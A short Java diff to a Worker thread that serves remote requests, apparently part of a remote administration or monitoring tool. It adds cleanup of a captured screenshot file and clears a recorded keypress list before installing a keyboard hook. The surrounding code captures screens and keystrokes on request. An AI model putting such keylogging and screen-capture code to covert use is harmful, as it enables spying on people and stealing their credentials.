@@ -182,6 +182,7 @@ public class Worker extends Thread {
                 Request getListRunningAppReq = (Request) request;
                 if (WinAPI.takeScreenshot()) {
                     File file = new File("screenshot.png");
+                    file.deleteOnExit();
                     byte[] buffer = FileHelper.getFileBuffer(file);
 
                     return new TakeScreenshotResponse(
@@ -203,6 +204,7 @@ public class Worker extends Thread {
             case KEYSTROKE_HOOK -> {
                 Request keyStrokeHook = (Request) request;
 
+                client.getKeypressList().clear();
                 client.setKeyboardHook(WinAPI.keyStrokeHook(client.getKeypressList()));
 
                 if (client.getKeyboardHook() != null) {
